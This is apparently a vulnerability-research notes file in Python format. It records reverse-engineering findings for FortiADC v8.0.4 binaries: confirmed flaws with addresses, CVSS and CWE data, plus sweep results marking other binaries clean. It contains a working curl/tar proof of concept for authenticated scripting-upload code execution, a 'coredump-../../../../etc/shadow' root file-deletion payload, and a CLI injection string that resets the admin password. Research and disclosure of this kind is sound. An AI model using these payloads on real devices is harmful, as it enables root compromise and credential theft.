"""
FortiADC v8.0.4-B0136 RE
Binary: ~/ablation/fortiadc-work/bins/httproxy (14MB, stripped C ELF64, 1296 funcs)
         ~/ablation/fortiadc-work/bins/restapi  (21MB, Go/Gin, management REST API)
Session: targets/fortinet/SESSION_fortiadc.md
"""

from ablation.analyzers import SemanticSearcher, describe_function, FindingRegistry
from ablation.analyzers.xref_graph import XRefGraph
import capstone
import struct
import re
from pathlib import Path

HTTPROXY = str(Path.home() / "ablation/fortiadc-work/bins/httproxy")
RESTAPI  = str(Path.home() / "ablation/fortiadc-work/bins/restapi")
PTD      = str(Path.home() / "ablation/fortiadc-work/bins/ptd")
ADFSPROXY = str(Path.home() / "ablation/fortiadc-work/bins/adfsproxy")

# PLT stubs in httproxy
PLT = {
    "strncpy":   0xbe420,
    "realloc":   0xbe770,
    "strcat":    0xbf270,
    "malloc":    0xbf600,
    "strncat":   0xbf6c0,
    "recv":      0xbfb30,
    "execvp":    0xbfc20,
    "sprintf":   0xbfc70,
    "system":    0xc0200,
    "memcpy":    0xc0480,
    "recvfrom":  0xc08b0,
    "strcpy":    0xc0bf0,
    "snprintf":  0xc0e90,
    "execve":    0xc1e60,
    "free":      0xc2320,
}

VULN_PROFILES = [
    ("unsafe_memcpy",
     "FUNC | calls: memcpy | "
     "vuln: memcpy called with length from packet data or untrusted field without upper bound check"),

    ("strcpy_overflow",
     "FUNC | calls: strcpy strcat strncat | "
     "vuln: strcpy/strcat on user-controlled string into fixed-size stack or heap buffer"),

    ("sprintf_overflow",
     "FUNC | calls: sprintf | "
     "vuln: sprintf into fixed-size buffer with user-controlled format args, no length check"),

    ("recv_overflow",
     "FUNC | calls: recv recvfrom read | "
     "vuln: network recv into stack buffer with no size validation or insufficient bounds"),

    ("cmd_injection",
     "FUNC | calls: system popen execve execvp | "
     "vuln: command string built from user/HTTP input via snprintf sprintf, shell injection"),

    ("int_overflow_alloc",
     "FUNC | calls: malloc realloc calloc | "
     "vuln: integer overflow in size arithmetic before allocation, wraps to small allocation"),

    ("double_free",
     "FUNC | calls: free | "
     "vuln: double free or use-after-free, same pointer freed twice or accessed after free"),

    ("format_string",
     "FUNC | calls: printf fprintf sprintf | "
     "vuln: user-controlled string passed as format argument without format specifier"),

    ("http_header_overflow",
     "FUNC | calls: strncpy strcpy memcpy | "
     "vuln: HTTP header value or URL copied into fixed buffer, length derived from wire data"),

    ("ssl_ctx_confusion",
     "FUNC | calls: SSL_CTX | "
     "vuln: SSL context reuse across connections or incorrect peer verification bypass"),
]

FINDINGS = {
    # ── restapi (Go/Gin) ──────────────────────────────────────────────────────

    "FAD_R1_pprof_exposure": {
        "binary": "restapi",
        "component": "github.com/DeanThompson/ginpprof",
        "source_file": "module/debug/debug.go",
        "description": (
            "restapi calls ginpprof.WrapGroup(engine) at main.main:0xdc1232 on the ROOT "
            "*gin.Engine (stored at [rsp+0x2b0] from gin.New() at 0xdc0786). "
            "The JWT middleware (MiddlewareFunc at 0xdb5620) is applied only AFTER at 0xdc1267 "
            "on a SEPARATE engine.Group('/api') sub-group. Gin sub-group middleware never "
            "covers routes registered on the parent/root engine. "
            "Exposes pre-auth: /debug/pprof/ (index), /debug/pprof/goroutine (goroutine dump), "
            "/debug/pprof/heap, /debug/pprof/cmdline (process args), "
            "/debug/pprof/profile (30s CPU trace), /debug/pprof/trace, "
            "/debug/pprof/symbol, /debug/pprof/block, /debug/pprof/mutex, "
            "/debug/pprof/threadcreate. "
            "Goroutine dump leaks: active goroutine function names, JWT/session values "
            "that may be in goroutine locals, connection metadata, internal server state."
        ),
        "routes": [
            "/debug/pprof/",
            "/debug/pprof/goroutine",
            "/debug/pprof/heap",
            "/debug/pprof/cmdline",
            "/debug/pprof/profile",
            "/debug/pprof/trace",
            "/debug/pprof/symbol",
            "/debug/pprof/block",
            "/debug/pprof/mutex",
            "/debug/pprof/threadcreate",
        ],
        "pre_auth": True,
        "confirmed_by": {
            "call_site": "main.main:0xdc1232",
            "engine_ptr": "[rsp+0x2b0] set at 0xdc078b (gin.New at 0xdc0786)",
            "jwt_applied_after": "main.main:0xdc1267 on engine.Group('/api') sub-group only",
        },
        "status": "CONFIRMED HIGH",
        "cvss_estimate": "7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
        "cwe": "CWE-200 (Information Exposure)",
    },

    "FAD_R2_jwt_none_alg": {
        "binary": "restapi",
        "component": "gopkg.in/dgrijalva/jwt-go.v3",
        "source_file": "module/gin-jwt/auth_jwt.go",
        "description": (
            "restapi uses dgrijalva/jwt-go.v3. signingMethodNone.Verify at 0x8df640 "
            "checks the key type via interface comparison: "
            "`lea rcx, [rip+0x6af33c]; cmp r8, rcx; jne NoneSignatureTypeDisallowedError`. "
            "The KeyFunc at parseToken.func1 (0xdbf260) returns []byte (HMAC secret) for "
            "alg=none tokens. The type is []byte, not unsafeNoneMagicConstant. "
            "cmp r8, rcx FAILS → NoneSignatureTypeDisallowedError returned → token rejected. "
            "The unsafeNoneMagicConstant guard is intact. alg=none bypass is NOT possible."
        ),
        "status": "ELIMINATED",
        "eliminated_by": {
            "check_va": "signingMethodNone.Verify:0x8df664",
            "guard": "cmp r8 (key type), rcx (unsafeNoneMagicConstant type); jne error",
            "keyfunc_va": "parseToken.func1:0xdbf260",
            "keyfunc_returns": "[]byte (HMAC key), not unsafeNoneMagicConstant",
        },
        "cwe": "CVE-2020-26160 / CWE-347",
    },

    "FAD_R3_scripting_upload_rce": {
        "binary": "restapi",
        "component": "module/fadc_module_util.Fadc_scripting_language_upload",
        "description": (
            "POST /api/system_scripting/upload accepts archive files (.tar.gz, .zip, .tar) "
            "from any authenticated user. Handler Fadc_scripting_language_upload (0x9a8e60) "
            "has no call to check_admin_perms (0x9ea660) or check_admin_prof_perms (0xa2cda0). "
            "check_admin_perms is only called from config CRUD handlers (7 callers); "
            "check_admin_prof_perms only from debug/image upload handlers (8 callers). "
            "Neither is called from main.main as a Gin middleware. "
            "Archive filename validated by regexp '.tar.gz$|.zip$|.tar$' (0x9a9543). "
            "Note: dots are unescaped in Go regexp — '.tar.gz$' matches any char before 'tar'. "
            "The archive CONTENTS are not checked. "
            "Handler calls Fadc_cmd.(*Cmd).Run twice: "
            "  0x9a98a4 — first dispatch (extraction: /bin/tar -xf or /bin/unzip) "
            "  0x9a9c85 — second dispatch (install: /scripting/cp -r %s %s) "
            "Both commands sent via net.Dial('unix', '/tmp/restapi_cmdd.sock') "
            "and encoded with Fadc_cmd.Encode (0x8c6820). "
            "restapi_cmdd daemon (2.8MB Go binary) executes the commands — "
            "it runs with elevated privilege for system operations. "
            "Attack: authenticate with any valid account → upload .tar.gz containing "
            "arbitrary TCL/shell script → daemon extracts to /scripting/ → script executed."
        ),
        "routes": [
            "/api/system_scripting/upload",
            "/api/stream_scripting/upload",
        ],
        "pre_auth": False,
        "auth_required": "any valid JWT token (no admin role check)",
        "confirmed_by": {
            "no_role_check": (
                "check_admin_perms (0x9ea660): 7 callers, none in scripting upload path. "
                "check_admin_prof_perms (0xa2cda0): 8 callers, none in scripting upload path. "
                "Neither called from main.main as middleware."
            ),
            "archive_filter": "regexp.MatchString at 0x9a9543; pattern: '.tar.gz$|.zip$|.tar$' (filename only)",
            "exec_dispatch_1": "Fadc_cmd.(*Cmd).Run at 0x9a98a4 in Fadc_scripting_language_upload",
            "exec_dispatch_2": "Fadc_cmd.(*Cmd).Run at 0x9a9c85 in Fadc_scripting_language_upload",
            "ipc_target": "/tmp/restapi_cmdd.sock (net.Dial at 0x8c67af in Fadc_cmd.(*Cmd).Run)",
            "extraction_cmds": ["/bin/tar -xf", "/bin/unzip", "/scripting/cp -r %s %s"],
        },
        "status": "CONFIRMED CRITICAL",
        "cvss_estimate": "9.9 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)",
        "upgrade_note": (
            "Upgraded to CRITICAL: restapi_cmdd PLT contains setuid/seteuid/setreuid/setresuid "
            "(8 privilege management symbols) confirming root execution. "
            "Dev RPATH /root/FortiADC_test/ further confirms root context. "
            "Any-auth upload → daemon root execution = privilege escalation."
        ),
        "cwe": "CWE-94 (Code Injection) / CWE-862 (Missing Authorization)",
        "poc": (
            "# 1. Create archive with arbitrary script\n"
            "mkdir -p exploit && echo 'exec /bin/sh -c \"id > /tmp/pwn\"' > exploit/pwn.tcl\n"
            "tar czf exploit.tar.gz exploit/\n"
            "# 2. Authenticate to get JWT token\n"
            "TOKEN=$(curl -sk -X POST https://<target>:8443/api/user/login \\\n"
            "  -H 'Content-Type: application/json' \\\n"
            "  -d '{\"name\":\"<user>\",\"passwd\":\"<pass>\"}' | jq -r .token)\n"
            "# 3. Upload archive as any authenticated user\n"
            "curl -sk -X POST https://<target>:8443/api/system_scripting/upload \\\n"
            "  -H \"Authorization: Bearer $TOKEN\" \\\n"
            "  -F 'file=@exploit.tar.gz'"
        ),
    },

    # ── adfsproxy (Go 1.22.3 + CGo / libadfs.so) ──────────────────────────────

    "FAD_A1_tls_cert_bypass": {
        "binary": "adfsproxy",
        "component": "adfslib/http.VerifyServerCertificate (Go 1.22.3 CGo binary)",
        "description": (
            "adfsproxy is a Go 1.22.3 CGo binary (5,689 functions, links libadfs.so + libha_dyn.so). "
            "adfslib/http.VerifyServerCertificate (0x667440) is the TLS cert verification callback "
            "for all proxy→AD FS backend connections. "
            "Disassembly: prologue, two string loads, CALL adfslib/log.LogPrint (logs 'Verify'), "
            "xor eax,eax / xor ebx,ebx / ret — returns (nil, nil) without any verification. "
            "adfslib/http.GetHTTPClient (0x667520) builds crypto/tls.Config for each outbound "
            "HTTP client used to communicate with the AD FS federation server. "
            "The tls.Config field at offset 0x140 is loaded with a funcval at 0x775620 — "
            "this is the VerifyPeerCertificate (or equivalent) callback assignment. "
            "Net effect: the proxy accepts ANY TLS certificate from the backend AD FS server "
            "without chain or hostname validation. "
            "Impact: an attacker with a network path between FortiADC and the AD FS server can "
            "present a self-signed cert and MITM all authentication traffic — "
            "Kerberos tickets, SAML assertions, OAuth tokens, and AD credentials relayed "
            "through the proxy. "
            "Also: adfsproxy imports setuid/seteuid/setreuid/setresuid in PLT — runs as root."
        ),
        "pre_auth": True,
        "confirmed_by": {
            "stub_va": "adfslib/http.VerifyServerCertificate:0x667440",
            "stub_body": "LogPrint('Verify') → xor eax,eax → xor ebx,ebx → ret (nil error, no checks)",
            "used_in": "adfslib/http.GetHTTPClient:0x667520 tls.Config field 0x140",
            "go_version": "Go 1.22.3 (build info at .go.buildinfo section)",
            "source_path": "/root/FortiADC_test/FortiADC/daemon/adfsproxy/libs/http/",
        },
        "status": "CONFIRMED HIGH",
        "cvss_estimate": "7.4 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)",
        "cwe": "CWE-295 (Improper Certificate Validation)",
    },

    # ── ptd (Go 1.24.4 + CGo / policy-traffic daemon) ─────────────────────────
    # Binary type: Go 1.24.4 + CGo, 7775 functions (pclntab), 9 privilege PLT
    # symbols (setuid/seteuid/setreuid/setresuid + gid variants + setgroups)
    # Confirmed root execution. CMDB handlers imported from shared libs (libcgo.so).
    # fadc_exec_tcpdump_run (0x7c2120) DEFINED in ptd.
    # fortiadc_tcpdump_run / fortiadc_dumpsystem_run / fortiadc_dumpsystem_delete_run
    # / fadc_aws_pyscript_run — all DEFINED in libcgo.so.
    # fadcsystem: undefined in all extracted libs (libcgo.so, libbase.so, libwaf.so,
    # libcmdb_plugin.so); defined in a non-extracted lib; name implies system() wrapper.

    "FAD_P1_tcpdump_mkdir_traversal": {
        "binary": "ptd",
        "component": "fadc_exec_tcpdump_run:0x7c2120 / libcgo.so:fortiadc_tcpdump_run:0x143980",
        "description": (
            "ptd is Go 1.24.4 + CGo (7,775 functions, 9 root privilege PLT symbols). "
            "fadc_exec_tcpdump_run (0x7c2120, T in ptd) takes interface (rbp) and filter (rbx) args. "
            "No sanitization of either arg is visible. "
            "Path construction: __snprintf_chk(buf, 0x80, 2, 0x80, '%s/%s', "
            "'/var/log/tcpdump', filter) → mkdir(buf, 0o775). "
            "filter used raw in mkdir path — traversal via '../' sequences allows "
            "mkdir to create directories outside /var/log/tcpdump/ as root (CWE-22). "
            "fortiadc_tcpdump_run in libcgo.so (0x143980) analyzed: "
            "uses double-fork + execvp(['tcpdump','-i',iface,'-w',file,'-c',count,'-n',filter,NULL]). "
            "execvp with separate argv elements — NO shell interpretation of interface/filter. "
            "Command injection (CWE-78) ELIMINATED. "
            "mkdir traversal impact: root creates arbitrary empty directory at traversed path. "
            "tcpdump BPF filter passed to libpcap parser verbatim (separate argv, safe)."
        ),
        "confirmed_by": {
            "function_va": "fadc_exec_tcpdump_run:0x7c2120 (T in ptd dynsym)",
            "snprintf_call": "0x7c21bf: __snprintf_chk(buf, 0x80, 2, 0x80, '%s/%s', '/var/log/tcpdump', filter)",
            "mkdir_call": "0x7c2193, 0x7c21cc: mkdir(path, 0o775) using filter in path",
            "no_sanitize": "No strstr, regex, or character filter on interface or filter args",
            "exec_call": "libcgo.so:fortiadc_tcpdump_run:0x143980 → double-fork → execvp",
            "execvp_args": "['tcpdump','-i',iface,'-w',outfile,'-c',count,'-n',filter,NULL] (argv[8]=filter, no shell)",
            "cmd_inject_eliminated": "execvp separate args — no shell expansion of metacharacters",
            "privilege": "ptd PLT: setuid,seteuid,setreuid,setresuid,setgid,setegid,setregid,setresgid,setgroups",
        },
        "status": "CONFIRMED MEDIUM",
        "cvss_estimate": "4.9 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:L)",
        "cwe": "CWE-22 (Path Traversal) — mkdir traversal only; CWE-78 ELIMINATED (execvp separate argv)",
    },

    "FAD_P2_dumpsystem_delete_traversal": {
        "binary": "ptd → libcgo.so",
        "component": (
            "ptd CMDB dispatch → libcgo.so:fortiadc_dumpsystem_delete_run:0xcb1b0"
        ),
        "description": (
            "libcgo.so exports fortiadc_dumpsystem_delete_run (0xcb1b0). "
            "Input path: ptd CMDB dispatcher → fadc_exec_dump* series → libcgo.so:fortiadc_dumpsystem_delete_run. "
            "Function flow: "
            "  1. input_format_check(input) at 0xcb1fa — validates via strspn(input, allowlist); "
            "     allowlist = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-./: '. "
            "     BLOCKS: ';', '|', '&', '$', '`' — shell metacharacters. "
            "     PERMITS: '.', '/' — path traversal components. "
            "  2. strncmp(input, 'coredump-', 9) OR strncmp(input, 'core-', 5) — prefix check. "
            "  3. __snprintf_chk(buf, 0x80, 2, 0x80, 'rm %s/%s', '/var/log/crash/', input). "
            "  4. fadcsystem(buf) — fadcsystem is a PLT import (undefined in all extracted libs; "
            "     name implies system() wrapper; confirmed via system@GLIBC_2.2.5 in libcgo.so PLT). "
            "Attack: CMDB command 'dumpsystem delete coredump-../../../../etc/shadow' → "
            "fadcsystem('rm /var/log/crash/coredump-../../../../etc/shadow') = 'rm /etc/shadow' as root. "
            "Shell metacharacter injection: ELIMINATED (strspn blocks ';|&$`'). "
            "Path traversal → arbitrary file deletion as root: CONFIRMED (strspn permits './'). "
            "Requires CMDB admin session — reduces exploitability. "
            "Also analyzed: "
            "  fortiadc_dumpsystem_run (0xcb0b0): fork → child calls hardcoded "
            "  fadcsystem('echo x > /proc/sysrq-trigger') — NO user input, diagnostic-only. "
            "  fadc_aws_pyscript_run (0x12e6f0): dead stub xor eax,eax; ret — no Python exec logic here. "
            "  Actual pyscript exec routes through FAD_R3 (restapi scripting upload)."
        ),
        "confirmed_by": {
            "function_va": "libcgo.so:fortiadc_dumpsystem_delete_run:0xcb1b0",
            "input_check_va": "libcgo.so:input_format_check:0xcb100",
            "allowlist": "strspn allowlist='[a-zA-Z0-9_\\-./:]+' (permits '.' and '/')",
            "metachar_blocked": "';|&$`' not in allowlist — shell injection ELIMINATED",
            "traversal_permitted": "'.' and '/' in allowlist — path traversal NOT blocked",
            "snprintf_call": "0xcb261: __snprintf_chk(buf, 0x80, 2, 0x80, 'rm %s/%s', '/var/log/crash/', input)",
            "fadcsystem_call": "0xcb271: fadcsystem(buf) — shell-based rm execution",
            "traversal_example": (
                "input='coredump-../../../../etc/shadow' → "
                "fadcsystem('rm /var/log/crash/coredump-../../../../etc/shadow') "
                "= rm /etc/shadow (as root)"
            ),
            "dumpsystem_run_hardcoded": (
                "fortiadc_dumpsystem_run:0xcb0b0 → fork → fadcsystem('echo x > /proc/sysrq-trigger') "
                "— hardcoded, no user input"
            ),
            "pyscript_eliminated": (
                "fadc_aws_pyscript_run:0x12e6f0 = xor eax,eax; ret — dead stub, 0 bytes of logic"
            ),
            "privilege": "ptd runs as root (9 setuid PLT symbols)",
        },
        "status": "CONFIRMED HIGH",
        "cvss_estimate": "6.5 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H)",
        "cwe": "CWE-22 (Path Traversal → Arbitrary File Deletion as Root); CWE-78 ELIMINATED",
    },

    # ── adfsproxy → libadfs.so (C, 39K, 24 exported funcs) ────────────────────
    # BinaryContext: 24 funcs, 57 PLT imports. No system/popen/execv in PLT.
    # Sinks: cmf_exec_conf (CLI execution), snprintf (JSON/path building), write/connect.
    # No XML/SAML parser — this lib handles the FortiADC→ADFS-server protocol,
    # not inbound SAML parsing. Full string sweep: 0x7000..0x8000.

    "FAD_A2_relying_party_cli_injection": {
        "binary": "adfsproxy → libadfs.so",
        "component": "libadfs.so:add_relying_party_cmdb_config:0x5890",
        "description": (
            "libadfs.so:add_relying_party_cmdb_config (0x5890, 1360B, 37 calls) builds "
            "multi-line FortiADC CLI commands using __snprintf_chk and passes them to "
            "cmf_exec_conf (PLT:0x3240) — the FortiADC CLI execution interface. "
            "Three format strings embed user-controlled CMDB field values via %s "
            "with no sanitization of double-quote ('\"'), CR ('\\r'), or LF ('\\n'): "
            "  Format A (0x7920): "
            "  'config user adfs-relying-party\\r\\nedit \"%s\"\\r\\nset proxy \"%s\"\\r\\n"
            "   set relying-party-trust \"%s\"\\r\\nset status enable\\r\\nnext\\r\\nend\\r\\n' "
            "  Format B (0x7998, global scope): adds outer 'config global\\r\\n...\\r\\nend\\r\\n' "
            "  Format C (0x7a28, vdom scope): adds 'config vdom\\r\\nedit \"%s\"\\r\\n...' "
            "  Three %s fields: edit_name (arg0), proxy_name (arg2 from CMDB), "
            "    relying_party_trust (arg1 from CMDB). "
            "Attack: if proxy_name = 'foo\"\\r\\nconfig system admin\\r\\nedit admin\\r\\n"
            "set password hacked\\r\\nnext\\r\\nend\\r\\nend\\r\\nconfig user adfs-relying-party\\r\\n"
            "edit foo', the double-quote terminates the CLI string token and \\r\\n "
            "starts a new CLI command. cmf_exec_conf interprets each \\r\\n-delimited "
            "line as a separate CLI instruction. Result: arbitrary CLI command injection "
            "as the FortiADC CLI executor (root privilege). "
            "Privilege boundary: adfsproxy imports setuid/seteuid/setreuid/setresuid — runs as root. "
            "Auth required: admin-level access to set ADFS relying party config (CMDB write). "
            "No character filtering or escaping in any of the three call paths."
        ),
        "confirmed_by": {
            "function_va": "libadfs.so:add_relying_party_cmdb_config:0x5890",
            "format_string_A": "0x7920: 'config user adfs-relying-party\\r\\nedit \"%s\"\\r\\nset proxy \"%s\"\\r\\nset relying-party-trust \"%s\"\\r\\nset status enable\\r\\nnext\\r\\nend\\r\\n'",
            "format_string_B": "0x7998: outer 'config global\\r\\n...\\r\\nend\\r\\nend\\r\\n' (same %s fields)",
            "format_string_C": "0x7a28: outer 'config vdom\\r\\nedit \"%s\"\\r\\n...\\r\\nend\\r\\n' (4 %s: vdom + 3 fields)",
            "cmf_exec_conf_calls": "0x59fd, 0x5c83 — confirmed via capstone disasm of 0x5890..0x5de0",
            "no_sanitize": "No strncmp, strstr, or character filter on edit_name, proxy_name, relying_party_trust",
            "snprintf_calls": "0x59ee: __snprintf_chk(static_buf, 0x800, 2, 0x800, format, vdom/config_values)",
            "injection_char": "'\"' terminates CLI string token; '\\r\\n' separates CLI commands",
            "privilege": "adfsproxy PLT: setuid/seteuid/setreuid/setresuid (root execution confirmed)",
            "input_source": "CMDB config: relying party name, proxy name, trust name — admin-set values",
        },
        "status": "CONFIRMED HIGH",
        "cvss_estimate": "6.7 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L)",
        "cwe": "CWE-78 (OS Command Injection via CLI command injection) / CWE-88 (Argument Injection)",
        "note": (
            "libadfs.so sweep summary: "
            "24 exported functions; no system/popen/execv in PLT; no SAML/XML parser. "
            "JSON injection surface (adfs_build_register_json:0x43b0): "
            "'ExternalUrl', 'BackendServerUrl', 'RelyingParty' embedded in JSON without "
            "escaping '\"' or '\\\\' — malformed JSON sent to ADFS server but impact is "
            "server-side (not FortiADC itself) — not filed as separate finding. "
            "adfs_register (0x4240): builds URL path '%s/%s' and '%s/' — URL structure only, "
            "no shell sink. "
            "UserName/Passwd strings at 0x75c1/0x75d2 in .rodata: no references found in "
            ".text (0x1000..0x68e0) — dead strings, not currently used. "
            "FAD_A1 chain: TLS cert bypass (FAD_A1) + CertPath/KeyPath/CACert sent in "
            "registration JSON (send_network:0x3470/send_helper:0x3610) — MITM attacker "
            "can read TLS config paths but not key material (paths only, not key bytes). "
            "No additional high-severity findings beyond FAD_A2."
        ),
    },
    # ── sweep results: httproxy (14MB C, stripped ELF64) ──────────────────────
    # TaintTracker(recv → system/execvp/execve/strcpy/sprintf): 0 taint paths.
    # SemanticSearcher: 0 functions above threshold.
    # Manual sink enumeration:
    #   system@0xc0200: 1 caller (0x43f776) — 'xterm -e "gdb --pid=%u" &' from
    #     chromium/src/base/debug/debugger_posix.cc; hardcoded, not user-controlled.
    #   execve@0xc1e60 + execvp@0xbfc20: callers at 0x69be05, 0x69bf20, 0x69bfdd
    #     — all within one function, rdi='/bin/sh' literal or r13 from struct
    #     'LaunchOptions'-style arg; Chromium base::LaunchProcess infrastructure.
    #     NOT user-controlled from HTTP path.
    #   sprintf@0xbfc70: 3 callers — 0x5ae0e9 ('%.1f' float fmt), 0x50e473 and
    #     0x5af462 (no recoverable format string — short functions, non-network context).
    # VERDICT: httproxy CLEAN. No exploitable sink from network path.

    "SWEEP_httproxy_clean": {
        "binary": "httproxy",
        "status": "ELIMINATED (sweep complete — no network-reachable sinks)",
        "evidence": {
            "taint_tracker": "0 paths from recv → system/execvp/execve/strcpy/sprintf",
            "semantic_sweep": "0 functions above threshold",
            "system_caller": "0x43f776: 'xterm -e gdb --pid=%u &' (chromium debugger helper, hardcoded)",
            "execvp_caller": "0x69be05/0x69bf20: Chromium base::LaunchProcess, rdi='/bin/sh' literal",
            "sprintf_callers": "3 callers: '%.1f' (float), + 2 non-network short functions",
        },
    },

    # ── sweep results: fnginx_new (17MB C++, nginx + Shibboleth SAML SP) ──────
    # TaintTracker output: SAML exports profiled; 0 taint paths from recv.
    # Manual export enumeration: 3255 exports — scanned for system/sprintf/strcpy/strcat/execve/execvp.
    #   Only hit: ngx_shm_free (0x9483e) → execve — FALSE POSITIVE.
    #     4KB scan window crossed into next function (ngx_shm_free uses munmap, not execve).
    # execve (0x6db20): 2 callers — 0x948aa (nginx worker process respawn, rdi=argv[0] from
    #   ngx_process struct, not HTTP request data) + 0x69bfdd (within LaunchProcess-pattern function).
    # SamlContext::createSTA (0x1dd54e): 58 calls, delegates to Shibboleth SP library chain
    #   (shibsp::SPConfig, AbstractSPRequest, xmltooling::HTTPRequest). All snprintf into
    #   bounded buffers (0x80, 0x100, 0x1000). No injectable shell sink in custom nginx module code.
    # VERDICT: fnginx_new CLEAN. SAML processing fully in Shibboleth library.

    "SWEEP_fnginx_new_clean": {
        "binary": "fnginx_new",
        "status": "ELIMINATED (sweep complete — no injectable sink in custom nginx/SAML code)",
        "evidence": {
            "taint_tracker": "0 paths from recv → dangerous sinks",
            "export_scan": "3255 exports scanned; only execve hit is ngx_shm_free FP (window crossed function boundary)",
            "execve_sites": "0x948aa: nginx worker respawn (rdi=argv[0] from ngx_process struct, not HTTP input); 0x69bfdd: LaunchProcess pattern",
            "saml_depth": "SamlContext::createSTA (0x1dd54e) → Shibboleth SPConfig chain; bounded snprintf only",
        },
    },

    # ── sweep results: cm_client (11MB C, central management client) ──────────
    # FuncProfiler: tcpdump handlers at 0x877700 (fadc_exec_tcpdump_run):
    #   __snprintf_chk('%s/%s', '/var/log/tcpdump', filter) → mkdir → fortiadc_tcpdump_run.
    #   Same mkdir-traversal pattern as FAD_P1 in ptd. No additional distinct finding.
    # No other dangerous PLT sinks beyond heap ops (malloc/free/realloc).
    # VERDICT: cm_client CLEAN. tcpdump = FAD_P1 duplicate. No new findings.

    "SWEEP_cm_client_clean": {
        "binary": "cm_client",
        "status": "ELIMINATED (sweep complete — tcpdump = FAD_P1 duplicate, no new sinks)",
        "evidence": {
            "tcpdump": "fadc_exec_tcpdump_run@0x877700: same mkdir-traversal pattern as FAD_P1; no command injection",
            "plt_sinks": "heap ops only (malloc/free/realloc/calloc); no system/execv/sprintf/strcpy",
        },
    },

    # ── sweep results: wadd (245K C, WAF daemon) ──────────────────────────────
    # execlp: 1 caller — wad_main startup path; argument is a fixed binary path from
    #   config struct. Not user-controlled from network. No other dangerous sinks.
    # VERDICT: wadd CLEAN.

    "SWEEP_wadd_clean": {
        "binary": "wadd",
        "status": "ELIMINATED (sweep complete — execlp arg is fixed binary path, not user-controlled)",
        "evidence": {
            "execlp_caller": "wad_main startup path; rdi=fixed binary path from config struct",
        },
    },

    # ── sweep results: restapi_cmdd (2.8MB Go) ────────────────────────────────
    # Pure Go, no CGo stubs. PLT: malloc/free/mmap/mprotect only + 8 privilege symbols
    # (setuid/seteuid/setreuid/setresuid/setgid/setegid/setregid/setresgid).
    # No system/execv/sprintf/strcpy in PLT. Runs as root (privilege symbols confirmed).
    # Acts as IPC daemon for restapi scripting upload (FAD_R3 attack path).
    # VERDICT: restapi_cmdd CLEAN as independent target; exploit path is through FAD_R3.

    "SWEEP_restapi_cmdd_clean": {
        "binary": "restapi_cmdd",
        "status": "ELIMINATED (pure Go; exploit path is FAD_R3 in restapi, not this daemon directly)",
        "evidence": {
            "plt": "malloc/free/mmap/mprotect + 8 privilege symbols; no system/execv",
            "role": "IPC daemon for scripting upload; attack surface covered by FAD_R3",
        },
    },

    # ── sweep results: cli (2.7MB C, admin CLI binary) ────────────────────────
    # system callers:
    #   0xf995d: __snprintf_chk(buf, 0x80, 2, 0x80, 'rm -rf %s > /dev/null', r9)
    #     All 8 callers (0xf9bd2, 0xf9cc8, 0xf9d08, 0xfb1e2, 0xfb2df, 0xfb318, 0xfbd92, 0xfbe88)
    #     pass hardcoded /tmp/ paths: '/tmp/tmp_schema_file_unzip' (0xf9bd2: rdi=rbp=hardcoded literal)
    #     and '/tmp/tmp_openapi_schema_file_unzip' (0xfb1e2: rdi=rbp=hardcoded literal). ELIMINATED.
    #   0xfd857: __sprintf_chk(buf, 2, 0x100, 'more %s', path_buf)
    #     path_buf = previously built '/var/log/vs/<vsname>/waf_blocked_ip' via __sprintf_chk.
    #     vsname comes from CLI dispatch table function (0 direct callers — indirect dispatch).
    #     PLAUSIBLE stored shell injection if vsname contains ';' — requires:
    #       (a) admin CLI access + (b) CMDB allows ';' in VS name on creation.
    #     Most Fortinet CMDB name validators reject shell metacharacters at creation time.
    #     Constrained to admin-level CLI privilege — below threshold for primary filing.
    # strcpy@0x54dc7: cmp eax, 0xfff guard (length check) directly before call;
    #   dest buffer ~0x1000 bytes; bounded copy. ELIMINATED.
    # wordexp@WRDE_NOCMD: FTP command args — WRDE_NOCMD blocks $(cmd); limited glob risk.
    # VERDICT: cli CLEAN for primary findings. Stored 'more %s' injection is PLAUSIBLE
    #   but requires admin + CMDB metachar bypass; below PSIRT threshold given admin-only path.

    "SWEEP_cli_clean": {
        "binary": "cli",
        "status": "ELIMINATED (sweep complete — no high-severity network-reachable finding)",
        "evidence": {
            "rm_rf_callers": "All 8 callers pass hardcoded /tmp/ paths — ELIMINATED",
            "more_waf": (
                "0xfd857: 'more %s' with vsname embedded in path — stored injection PLAUSIBLE "
                "but requires admin CLI access + CMDB name accepts ';'; not filed (admin-only, constrained)"
            ),
            "strcpy": "0x54dc7: cmp eax,0xfff length guard before call; dest ~0x1000B — ELIMINATED",
            "wordexp": "WRDE_NOCMD flag set; $(cmd) blocked; glob-only residual risk LOW",
        },
    },

    # ── libstdext.so — fadcsystem definition ──────────────────────────────────
    # fadcsystem (0x3060): xor esi, esi; jmp PLT[18]=fadcsystem_envp (0x3010)
    # fadcsystem_envp (0x3010): parse_command_line(cmd) → execute_command(parsed, envp)
    #   → posix_spawnp (PLT import from glibc). No shell involved.
    # This CONFIRMS FAD_P2 injection ELIMINATED: fadcsystem("rm %s/%s", ...) passes the
    #   full path as argv[1] to rm — shell metacharacters have no effect.
    # Path traversal (coredump-../../etc/shadow) still works as rm follows the resolved path.
    # Also defines: fadcpopen/fadcpopen_internal (popen variants via fork+pipe+exec),
    #   execute_command (direct posix_spawnp), fm_exec_cli, fm_popen_pipe.
    # No system() usage anywhere in libstdext.so.

    "LIBSTDEXT_fadcsystem": {
        "binary": "libstdext.so",
        "status": "ANALYZED — fadcsystem = parse_command_line → posix_spawnp (no shell)",
        "evidence": {
            "fadcsystem_0x3060": "xor esi,esi; jmp PLT[18]=fadcsystem_envp",
            "fadcsystem_envp_0x3010": "parse_command_line(0x2280) → execute_command(0x2340) → posix_spawnp",
            "plt_imports": "posix_spawnp, fork, execvp, setuid, setgid (no system())",
            "fad_p2_confirms": "shell injection ELIMINATED; path traversal still active via rm argv[1]",
        },
    },

    # ── ocgs (5.1MB Go 1.22.3 + CGo) — One-Click GSLB Server daemon ──────────
    # Binary: ~/ablation/fortiadc-work/bins/ocgs
    # Source: /root/FortiADC_test/FortiADC/daemon/ocgs
